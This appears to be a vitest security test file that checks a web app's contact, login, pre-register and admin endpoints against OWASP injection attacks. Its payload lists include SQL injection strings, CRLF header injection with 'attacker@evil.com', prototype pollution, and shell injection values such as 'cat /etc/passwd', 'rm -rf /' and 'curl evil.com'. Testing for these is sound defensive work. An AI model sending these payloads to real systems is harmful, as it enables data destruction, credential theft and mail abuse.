/**
 * Security Test: Injection (OWASP A03)
 *
 * Tests for:
 * - SQL injection via Supabase/PostgREST filters
 * - NoSQL injection patterns
 * - Command injection via user inputs
 * - Header injection
 */

import { describe, it, expect } from 'vitest'
import { secFetch } from './helpers/http-client'
import { ROUTES } from './helpers/constants'

describe('OWASP A03: Injection', () => {
  describe('SQL injection via API inputs', () => {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "1; SELECT * FROM users",
      "' UNION SELECT * FROM users --",
      "1' AND 1=1 --",
      "admin'--",
      "' OR 1=1 LIMIT 1 --",
    ]

    it('should not be vulnerable to SQL injection in contact name field', async () => {
      for (const payload of sqlPayloads) {
        const res = await secFetch(ROUTES.contact, {
          method: 'POST',
          body: JSON.stringify({
            name: payload,
            email: 'sqli@test.com',
            message: 'SQL injection test',
          }),
        })

        // Should be 200 (accepted), 400 (validation), or 429 (rate limit)
        // Never 500 (unhandled SQL error)
        expect(
          res.status,
          `SQL injection payload crashed the server: ${payload} (got ${res.status})`
        ).not.toBe(500)
      }
    })

    it('should not be vulnerable to SQL injection in login email', async () => {
      for (const payload of sqlPayloads) {
        const res = await secFetch(ROUTES.login, {
          method: 'POST',
          body: JSON.stringify({
            email: payload,
            password: 'testpassword',
          }),
        })

        expect(
          res.status,
          `SQL injection in login email crashed server: ${payload}`
        ).not.toBe(500)
      }
    })

    it('should not be vulnerable to SQL injection in pre-register email', async () => {
      for (const payload of sqlPayloads) {
        const res = await secFetch(ROUTES.preRegister, {
          method: 'POST',
          body: JSON.stringify({ email: payload }),
        })

        expect(
          res.status,
          `SQL injection in pre-register crashed server: ${payload}`
        ).not.toBe(500)
      }
    })
  })

  describe('PostgREST filter injection', () => {
    it('should sanitize search params in admin user query', async () => {
      // PostgREST uses special operators: .eq., .like., .in.
      // If search input is passed unsanitized, it could manipulate queries
      const filterPayloads = [
        'admin).or(role.eq.admin',
        'test%25',
        'user;role.eq.admin',
        'test.eq.admin,role.in.(admin)',
      ]

      for (const payload of filterPayloads) {
        const res = await secFetch(
          `${ROUTES.adminUsers}?search=${encodeURIComponent(payload)}`,
          { method: 'GET' }
        )

        // Should be 401 (no admin auth) — but critically should not execute the injection
        expect(res.status).toBe(401)
      }
    })
  })

  describe('Header injection', () => {
    it('should not allow CRLF injection in contact form name', async () => {
      const crlfPayloads = [
        'Test\r\nBcc: attacker@evil.com',
        'Test\nContent-Type: text/html',
        'Test\r\nSubject: Hacked',
      ]

      for (const payload of crlfPayloads) {
        const res = await secFetch(ROUTES.contact, {
          method: 'POST',
          body: JSON.stringify({
            name: payload,
            email: 'crlf@test.com',
            message: 'CRLF injection test',
          }),
        })

        // The server should strip \r\n from headers/email subjects
        // Should not crash
        expect(res.status).not.toBe(500)
      }
    })
  })

  describe('JSON injection', () => {
    it('should handle prototype pollution attempts', async () => {
      const res = await secFetch(ROUTES.contact, {
        method: 'POST',
        body: JSON.stringify({
          name: 'Test',
          email: 'proto@test.com',
          message: 'Test',
          __proto__: { isAdmin: true },
          constructor: { prototype: { isAdmin: true } },
        }),
      })

      // Zod should strip unknown fields; should not crash
      expect(res.status).not.toBe(500)
    })

    it('should handle deeply nested JSON', async () => {
      // Build deeply nested object to test stack overflow
      let nested: Record<string, unknown> = { value: 'deep' }
      for (let i = 0; i < 100; i++) {
        nested = { nested }
      }

      const res = await secFetch(ROUTES.contact, {
        method: 'POST',
        body: JSON.stringify({
          name: 'Test',
          email: 'deep@test.com',
          message: 'Deep nesting test',
          extra: nested,
        }),
      })

      // Should be handled gracefully by Zod (strips unknown fields)
      expect(res.status).not.toBe(500)
    })
  })

  describe('Command injection', () => {
    const cmdPayloads = [
      '$(whoami)',
      '`cat /etc/passwd`',
      '| ls -la',
      '; rm -rf /',
      '&& curl evil.com',
    ]

    it('should not be vulnerable to command injection in contact message', async () => {
      for (const payload of cmdPayloads) {
        const res = await secFetch(ROUTES.contact, {
          method: 'POST',
          body: JSON.stringify({
            name: 'Cmd Test',
            email: 'cmd@test.com',
            message: payload,
          }),
        })

        expect(
          res.status,
          `Command injection payload caused error: ${payload}`
        ).not.toBe(500)
      }
    })
  })
})
